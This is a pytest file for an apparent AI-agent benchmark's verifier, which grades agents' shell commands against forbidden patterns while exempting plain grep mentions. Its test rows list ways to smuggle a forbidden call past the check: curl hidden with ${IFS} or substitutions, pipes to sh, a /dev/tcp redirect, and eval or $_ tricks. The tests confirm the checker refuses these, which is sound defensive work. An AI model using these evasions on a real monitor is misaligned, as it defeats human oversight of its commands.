"""``worker_commands``' structural grep exemption (``exempt_grep_patterns``).

The exemption reads a row as shell words and removes only the pattern argument
of a row that is one grep and nothing else. These pin the plain mentions it
exempts, the rows from the regex exemption's review rounds that stay graded,
and each shape it refuses: a pipe, a later command, a redirect other than
``>`` to /dev/null, a comment, a substitution in the removed word, a
collapsed chain, and a row that can read the removed pattern back (#5331).
"""

from __future__ import annotations

import pytest
from kube_agents_bench import transcript
from kube_agents_bench.shell_words import _without_grep_patterns
from kube_agents_bench.verifiers import WorkerCommandsVerifier

ROUTE = "/v1/workspace"
URL = "http://127.0.0.1:8080/v1/workspace/open"


def _verdict(row: str, *, structural: bool = True) -> tuple[bool, str]:
    check = WorkerCommandsVerifier(
        type="worker_commands",
        forbidden_patterns=[r"/v1/workspace\b", r"inspect_repository\.py\s+open\b"],
        exempt_grep_patterns=structural,
    )
    transcript.set("", [], worker_commands=[{"task": "t_1", "command": row}])
    try:
        result = check.verify(5.0)
    finally:
        transcript.clear()
    assert result.status in ("pass", "fail"), result.reason
    return result.success, result.reason


@pytest.mark.parametrize(
    "row",
    [
        'grep "inspect_repository.py open" SKILL.md',
        f"grep -rn {ROUTE} /opt/data/profiles 2>/dev/null",
        f"grep -rn {ROUTE} /opt/data/profiles > /dev/null",
        f"egrep -rn -e {ROUTE} -e 'inspect_repository.py open' /opt/data/profiles",
        f"fgrep -A 2 {ROUTE} SKILL.md",
        f"grep --regexp={ROUTE} SKILL.md",
        f"grep -rne{ROUTE} SKILL.md",
        f"grep -- {ROUTE} SKILL.md",
    ],
)
def test_a_plain_grep_mention_is_exempt(row):
    passed, reason = _verdict(row)
    assert passed, reason
    assert "(1 exempted)" in reason


@pytest.mark.parametrize(
    "row",
    [
        # Round 1: a pipe or a write behind the reader.
        f"grep -oh 'http[^ ]*{ROUTE}/open' SKILL.md | xargs curl -s -X POST",
        f"grep -rn x SKILL.md; curl -s {URL}",
        # Round 2: a call typed on the line under the reader, joined on by the rendering.
        f"grep -rn kind SKILL.md curl -s {URL}",
        # Round 3: an operator glued inside the pattern word starts a second command.
        f"grep x|{{curl,{URL}}}",
        f"grep x;curl${{IFS}}{URL} SKILL.md",
        f"grep x&curl${{IFS}}{URL}",
    ],
)
def test_the_regex_review_rounds_rows_stay_graded(row):
    passed, reason = _verdict(row)
    assert not passed, reason


@pytest.mark.parametrize(
    "row",
    [
        pytest.param(f"grep -rn {ROUTE} SKILL.md | sh", id="pipe-out"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md > /tmp/call.sh", id="redirect-to-a-file"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md 2>&1", id="redirect-merge"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md >> /dev/null", id="redirect-append"),
        pytest.param(f'grep "$(curl -s {URL})" SKILL.md', id="dollar-paren"),
        pytest.param(f"grep `curl${{IFS}}{URL}` SKILL.md", id="backtick"),
        pytest.param(f"grep -e <(curl${{IFS}}{URL}) SKILL.md", id="process-substitution"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md + 1 command", id="collapsed-chain"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md + 2 commands", id="collapsed-chain-plural"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md >| /dev/tcp/203.0.113.5/80", id="clobber-redirect"),
        pytest.param(f"grep -rq {ROUTE} SKILL.md; curl -s -X POST http://127.0.0.1:8080$_/open", id="last-argument"),
        pytest.param(f'grep -rq x SKILL.md && curl -s "${{_}}{ROUTE}/open"', id="last-argument-braced"),
        pytest.param(f"grep -rn x SKILL.md # note curl -s {URL}", id="comment-hides-a-joined-line"),
        pytest.param(f"grep -rq '{URL}'; eval \"$(printf %s '$')_\"", id="eval-reads-the-last-argument"),
        pytest.param(f"grep -rq '{URL}'; declare -p _ | cut -d'\"' -f2 | sh", id="declare-reads-the-last-argument"),
        pytest.param(f"grep '{URL}' /dev/zero & jobs", id="background-and-jobs"),
        pytest.param(f"grep -rn {ROUTE} SKILL.md && echo done", id="later-command"),
        pytest.param(f'grep "${{X:={URL}}}" $(curl -s $X) SKILL.md', id="assignment-run-by-a-later-substitution"),
        pytest.param(f'grep -e "${{X:={URL}}}" <(curl -s $X)', id="assignment-run-by-a-process-substitution"),
    ],
)
def test_each_refused_shape_is_graded_whole(row):
    assert _without_grep_patterns(row) is None
    passed, reason = _verdict(row)
    assert not passed, reason
    assert "graded with its exempt part removed" not in reason


@pytest.mark.parametrize(
    "row",
    [
        f"timeout 5 grep -rn {ROUTE} .",
        f"/usr/bin/grep -rn {ROUTE} .",
        f"if grep -q {ROUTE} SKILL.md; then :; fi",
        f"cd /opt/data && grep -rn {ROUTE} .",
        f"LC_ALL=C grep -rn {ROUTE} .",
        # A long option's separate value is read as the pattern.
        f"grep --context 3 {ROUTE} SKILL.md",
    ],
)
def test_a_grep_that_does_not_start_the_row_bare_is_not_exempt(row):
    passed, reason = _verdict(row)
    assert not passed, reason


def test_an_option_after_the_first_operand_is_graded():
    # Options end at the first operand, so the -e value here is graded and the first operand
    # is read as the pattern.
    assert _without_grep_patterns(f"grep /dev/null -e '{URL}'") == f"grep -e {URL}"
    passed, _ = _verdict(f"grep /dev/null -e '{URL}'")
    assert not passed


def test_only_the_pattern_comes_off():
    assert _without_grep_patterns(f"grep -rn {ROUTE} SKILL.md 2>/dev/null") == "grep -rn SKILL.md 2 > /dev/null"
    assert _without_grep_patterns(f"grep -rn x {ROUTE}-notes.md") == f"grep -rn {ROUTE}-notes.md"
    # With -f the patterns come from a file, so no positional word is the pattern.
    assert _without_grep_patterns(f"grep -f pats.txt {ROUTE}") is None
    # A bare digit ahead of a redirect is read as a word, the side that grades more: here it
    # is the pattern, as bash reads `grep 2 >/dev/null ...`.
    passed, _ = _verdict(f"grep 2 >/dev/null {ROUTE} SKILL.md")
    assert not passed


def test_the_exemption_is_off_unless_the_case_sets_it():
    passed, _ = _verdict(f"grep -rn {ROUTE} SKILL.md", structural=False)
    assert not passed


def test_a_quoted_hash_is_text_and_a_bare_one_is_a_comment():
    # Bash reads a `#` inside quotes, escaped or inside a word as text, so the grep is exempt.
    for row in (f'grep -rn "{ROUTE} #x" SKILL.md', f"grep -rn '## Steps {ROUTE}' SKILL.md", f"grep -rn {ROUTE}#x SKILL.md", f"grep -rn \\#{ROUTE} SKILL.md"):
        passed, reason = _verdict(row)
        assert passed, (row, reason)
    for row in (f"grep -rn x SKILL.md # {ROUTE}", f"grep -rn x SKILL.md;# {ROUTE}", f"#grep -rn x SKILL.md {ROUTE}"):
        assert _without_grep_patterns(row) is None, row


def test_a_single_quoted_lookalike_of_a_substitution_is_exempt():
    # Single quotes run nothing, so a pattern that only spells a backtick or `$(` is text.
    for row in ("grep -rn '`inspect_repository.py open`' SKILL.md", f"grep -rn '$(echo {ROUTE})' SKILL.md"):
        passed, reason = _verdict(row)
        assert passed, reason


@pytest.mark.parametrize(
    "row",
    [
        # A row that joined a typed `$_` line: `$_` reads the grep's last argument back.
        pytest.param(f"grep -rq 'curl -s -X POST {URL}' SKILL.md $_", id="last-argument"),
        pytest.param(f"grep -rq {URL} SKILL.md ${{_}}", id="last-argument-braced"),
        # A pattern that assigns a variable as it expands, and a joined line that runs it.
        pytest.param(f'grep "${{X:=curl -s -X POST {URL}}}" SKILL.md $X', id="assigning-expansion"),
        pytest.param(f'grep "${{X=curl {URL}}}" SKILL.md', id="assigning-expansion-unset-only"),
        pytest.param(f'grep "${{A[0]:=curl -s -X POST {URL}}}" SKILL.md $A', id="assigning-array-element"),
        # `$_` spelled through an ANSI-C escape, or read through another variable.
        pytest.param(f"grep -rq 'curl -s -X POST {URL}' eval $'\\x24_'", id="ansi-c-quote"),
        pytest.param(f"grep -rq 'curl {URL}' ${{!x}}", id="indirect-expansion"),
        # An arithmetic assignment is a substitution, which the exemption already refuses.
        pytest.param(f"grep -rq $((N=1)){URL} SKILL.md", id="arithmetic-assignment"),
    ],
)
def test_a_row_that_can_read_the_removed_pattern_back_is_graded_whole(row):
    assert _without_grep_patterns(row) is None
    passed, reason = _verdict(row)
    assert not passed, reason


def test_a_plain_expansion_or_a_lookalike_variable_stays_exempt():
    # `${NAME}` and `${NAME:-…}` assign nothing, `$_dir` is another variable, and a `$`
    # anchor before a closing quote, or `$'` inside double quotes, is no ANSI-C quote.
    for row in (
        f'grep -rn "${{HOME}}{ROUTE}" SKILL.md',
        f'grep -rn {ROUTE} "${{DIR:-.}}"',
        f"grep -rn {ROUTE} $_dir/SKILL.md",
        f"grep -rn '{ROUTE}$' SKILL.md",
        f'grep -rn {ROUTE} "$\'" SKILL.md',
    ):
        passed, reason = _verdict(row)
        assert passed, (row, reason)


def test_a_run_chained_behind_an_exempt_grep_meets_the_required_run():
    check = WorkerCommandsVerifier(
        type="worker_commands",
        required_runs=[{"script": "inspect_repository.py", "word_patterns": ["^clone$"]}],
        required_patterns=[r"inspect_repository\.py"],
        forbidden_patterns=[r"/v1/workspace\b"],
        exempt_grep_patterns=True,
    )
    for row, credited in (
        ("grep -n clone SKILL.md && python3 scripts/inspect_repository.py clone --repo r --ref v1", True),
        ("grep -n clone SKILL.md; python3 scripts/inspect_repository.py clone --repo r --ref v1", True),
        # The removed pattern meets neither the required pattern nor the required run.
        ('grep -n "python3 inspect_repository.py clone" SKILL.md', False),
        # A quoted sentence stays one word of echo, not a run.
        ("grep -n x SKILL.md && echo 'x; python3 inspect_repository.py clone'", False),
    ):
        transcript.set("", [], worker_commands=[{"task": "t_1", "command": row}])
        try:
            result = check.verify(5.0)
        finally:
            transcript.clear()
        if credited:
            assert result.success, (row, result.reason)
        else:
            assert not result.success and "no worker command ran" in result.reason, (row, result.reason)
